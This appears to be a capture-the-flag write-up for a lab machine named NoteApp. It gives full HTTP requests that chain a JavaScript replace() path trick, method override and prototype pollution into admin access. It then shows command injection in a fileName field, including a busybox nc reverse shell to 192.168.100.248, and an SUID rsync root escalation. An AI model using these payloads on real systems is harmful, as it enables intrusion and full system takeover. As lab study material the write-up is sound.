# NoteApp

## High Level Overview

NoteApp is a high-level Linux machine with several vulnerabilities that, when combined, grant us root access to the system. Upon analyzing the source code of the application, We find an interesting functionality in GenerateNoteUrl() function which is a regex checking vulnerability of .replace() method and exploit it to gain access to unreachable hidden internal endpoints. From there, we discover a vulnerable /api/admin/create-admin-user endpoint being vulnerable to Prototype Pollution. After that we create a user with admin privileges and exploit an RCE in /api/admin/delete-profile-photo by simply applying our reverse shell command. After getting a reverse shell as a normal user in the system, we find that rsync is set as SUID bit. We make use of SUID command for this command in GTFOBins and obtain an elevated shell.

# Recon

NMAP finds 1 open TCP port, HTTP port 8080.

![https://i.ibb.co/bW3Svbh/nmap.png](https://i.ibb.co/bW3Svbh/nmap.png)

## Site

This site reveals its GitHub source code link in ‘/’ endpoint.

![https://i.ibb.co/2gnJWVH/project-link.png](https://i.ibb.co/2gnJWVH/project-link.png)

![https://i.ibb.co/7Qhb74n/github-dev.png](https://i.ibb.co/7Qhb74n/github-dev.png)

Through analyzing the source code of the web application, we come across with 2 main services being called ‘Gateway’ and ‘Internal’ in turn.

The default port for the ‘Internal’ service is only available through local meaning that this is blocked by the local firewall for direct communication.

## GitHub Endpoints

### /sign-in and /sign-up

![https://i.ibb.co/sK1Ykx9/Gateway-Auth-Route.png](https://i.ibb.co/sK1Ykx9/Gateway-Auth-Route.png)

As its name suggests, the ‘Gateway’ service is acting like a gateway between ‘Internal’ service and the NoteApp User.

It seems we are able to register and log in to send requests to these endpoints below.

![https://i.ibb.co/1dPKRQg/Gateway-User-route.png](https://i.ibb.co/1dPKRQg/Gateway-User-route.png)

### Sign-Up request in BurpSuite

```bash
POST /sign-up HTTP/1.1
Host: noteapp.icsd:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 95

{"email": "huseyn.aghazada@prosol.az","username":"huseyna12","password":"hehehe12","age": 12
}
```

![https://i.ibb.co/PDmpYC4/Sign-In-Request.png](https://i.ibb.co/PDmpYC4/Sign-In-Request.png)

### Sign-In request in BurpSuite

```bash
POST /sign-in HTTP/1.1
Host: noteapp.icsd:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 62

{"email": "huseyn.aghazada@prosol.az","password":"hehehe12"
}
```

![https://i.ibb.co/zJ8YmsB/Sign-In-Request.png](https://i.ibb.co/zJ8YmsB/Sign-In-Request.png)

### GenerateNoteUrl

This URL Generator function directly uses `.replace()` method of JavaScript.

![https://i.ibb.co/YQX1x4N/Gateway-User-Controller-Bypass-Gateway.png](https://i.ibb.co/YQX1x4N/Gateway-User-Controller-Bypass-Gateway.png)

When we search for `.replace()` method of JS, it can be seen that this method is taking arguments of `RegExp` object along with strings.

![https://i.ibb.co/3rQ3Vh3/String-Replace.png](https://i.ibb.co/3rQ3Vh3/String-Replace.png)

Let’s put these things together.

```jsx
const noteUrl = `${base_url}method-user-note/:NoteId:/`;

const GenerateNoteUrl = (method, NoteId) => {
  return noteUrl.replace('method', method).replace(':NoteId:', NoteId);
};
```

`method` variable in the first `replace()` method cannot directly be abused by the attacker, however, the second `NoteId` is a user input. Therefore, let’s look at the second `.replace()` method.

As can be seen from this [website](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace), Adding `$’` to the NoteId input, it will cause for the `.replace()` method to add the portion of the string (`/`) that follows the matched substring (`:NoteId:`).

For simplicity, I used the following node script.

```jsx
const noteUrl = 'http://localhost/:8080/get-user-note/:NoteId:/'
USERINPUT = `huseyn$'aghazada`
noteUrl.replace(':NoteId:', USERINPUT);
```

![https://i.ibb.co/VYgHZbZ/personal-node-for-replace.png](https://i.ibb.co/VYgHZbZ/personal-node-for-replace.png)

This means that we can send direct requests to hidden `Internal` service endpoints such as `/first_flag` endpoint that I have added.

![https://i.ibb.co/5knnnKK/first-flag.png](https://i.ibb.co/5knnnKK/first-flag.png)

![https://i.ibb.co/LzGYwGF/Delete-request.png](https://i.ibb.co/LzGYwGF/Delete-request.png)

After successfully retrieving the first flag, we can go for the second flag.

Also from the image above in ./internal/app.js file, you can see that with _method=METHOD query, it is possible to override the HTTP method that is sent to the Internal service.

This is for checking:

![https://i.ibb.co/bJ2bS6f/Method-override-checking.png](https://i.ibb.co/bJ2bS6f/Method-override-checking.png)

We can successfully override the method with *_method* query.

### Prototype Pollution

From the code in `AdminController.js`, we can create an admin user via exploiting prototype pollution.

```jsx
exports.CreateAdminUser = (req, res) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({ errors: errors.array() });
  }
  const user = req.body;
  
  if (user.isAdmin && user.SecretCode !== SecretCode) {
    return res.status(401).json({ message: 'No Admin User is created!!!' });
  }
  else {
    let NewUser = Object.assign(DefaultUser, user);
    if (NewUser.isAdmin) {
      bcrypt.hash(NewUser.password, 10, (err, hashedPassword) => {
        if (err) {
          return res.status(500).json({ message: 'Error hashing password' });
        }

        AdminUser.findByUsername(NewUser.username, (existingAdminUserByUsername) => {
          if (existingAdminUserByUsername) {
            return res.status(400).json({ message: 'Username is already taken' });
          }
          AdminUser.create(NewUser.username, hashedPassword, (adminId) => {
            return res.status(201).json({ message: 'Admin User is successfully created', adminId });
          });
        });
      });
    }
    else {
      return res.status(401).json({ message: 'No Admin User is created!!!' });
    }
  }
};
```

In javascript, the arguments in `Object.assign()` is given in wrong order and also there is no any checking via assign the variable `user` into `req.body`.

```jsx
PUT /update-user-note/..$'..$'admin$'create-admin-user%3F_method=POSt& HTTP/1.1
Host: noteapp.icsd:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 86
Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1ZWI5M2I5OS02NzJhLTQ1ZGItYTBhNS1mYjk0OTJlNWRjNTUiLCJpYXQiOjE2OTYyNzMwNzQsImV4cCI6MTY5NjI3NDg3NH0.a2Gk3S4ppWkiOJk9lIwGjqLyBPaPtdv_S0L0sKINTSo

{
"username": "admin",
"password":"adminadmin",
"__proto__": { "isAdmin":true
}
}
```

![https://i.ibb.co/4T2Gdvm/Prototype-pollution-exploit.png](https://i.ibb.co/4T2Gdvm/Prototype-pollution-exploit.png)

Let’s login as newly created admin user.

```jsx
PUT /update-user-note/..$'..$'admin$'login-as-admin%3F_method=POST& HTTP/1.1
Host: noteapp.icsd:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 49
Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1ZWI5M2I5OS02NzJhLTQ1ZGItYTBhNS1mYjk0OTJlNWRjNTUiLCJpYXQiOjE2OTYyNzMwNzQsImV4cCI6MTY5NjI3NDg3NH0.a2Gk3S4ppWkiOJk9lIwGjqLyBPaPtdv_S0L0sKINTSo

{
"username": "admin",
"password":"adminadmin"}
```

![https://i.ibb.co/d4svqbh/Login-As-Admin.png](https://i.ibb.co/d4svqbh/Login-As-Admin.png)

Now, we are an admin user. Last thing is to abuse the endpoints that are accessible by admin user.

![https://i.ibb.co/25wxJv7/Delete-Profile-Photo.png](https://i.ibb.co/25wxJv7/Delete-Profile-Photo.png)

It seems we can exploit this by simply sending semicolon and execute our listener command.

```jsx
PUT /update-user-note/..$'..$'admin$'delete-profile-photo%3F_method=POST& HTTP/1.1
Host: noteapp.icsd:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 43
Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1ZWI5M2I5OS02NzJhLTQ1ZGItYTBhNS1mYjk0OTJlNWRjNTUiLCJpYXQiOjE2OTYyNzMwNzQsImV4cCI6MTY5NjI3NDg3NH0.a2Gk3S4ppWkiOJk9lIwGjqLyBPaPtdv_S0L0sKINTSo
X-Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbklkIjoiY2M3MWU5N2UtNWE3MC00MDQ0LThjMjUtYzFkODczNzM4NzMzIiwiaWF0IjoxNjk2Mjc1NzE2LCJleHAiOjE2OTYyNzkzMTZ9.pdR7ok7Xn-cU3YDZVperWvFTD9TNR789abKJ3QsmtBs

{
"fileName": "random_file.jpg; whoami"
}
```

![https://i.ibb.co/pKcp8wN/delete-profile-whoami.png](https://i.ibb.co/pKcp8wN/delete-profile-whoami.png)

Using `busybox` instead of direct `nc` command seems more opsec for me.

```jsx
PUT /update-user-note/..$'..$'admin$'delete-profile-photo%3F_method=POST& HTTP/1.1
Host: noteapp.icsd:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 79
Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI1ZWI5M2I5OS02NzJhLTQ1ZGItYTBhNS1mYjk0OTJlNWRjNTUiLCJpYXQiOjE2OTYyNzMwNzQsImV4cCI6MTY5NjI3NDg3NH0.a2Gk3S4ppWkiOJk9lIwGjqLyBPaPtdv_S0L0sKINTSo
X-Authorization:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG1pbklkIjoiY2M3MWU5N2UtNWE3MC00MDQ0LThjMjUtYzFkODczNzM4NzMzIiwiaWF0IjoxNjk2Mjc1NzE2LCJleHAiOjE2OTYyNzkzMTZ9.pdR7ok7Xn-cU3YDZVperWvFTD9TNR789abKJ3QsmtBs

{
"fileName": "random_file.jpg; busybox nc 192.168.100.248 53 -e /bin/bash"
}
```

![https://i.ibb.co/GW4rP32/Shell-Generated.png](https://i.ibb.co/GW4rP32/Shell-Generated.png)

## Privilege Escalation

After successfully getting reverse shell, we can go for the privilege escalation.

```jsx
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

![https://i.ibb.co/k11r9W8/findsuids.png](https://i.ibb.co/k11r9W8/findsuids.png)

It seems `rsync` command has SUID permission, so lets search this in **[GTFOBins](https://gtfobins.github.io/)**. This command is enough to get elevated shell.

```jsx
rsync -e 'sh -p -c "sh -p 0<&2 1>&2"' 127.0.0.1:/dev/null
```

![https://i.ibb.co/crXc6Mt/root-flag.png](https://i.ibb.co/crXc6Mt/root-flag.png)

Thank you for Reading!!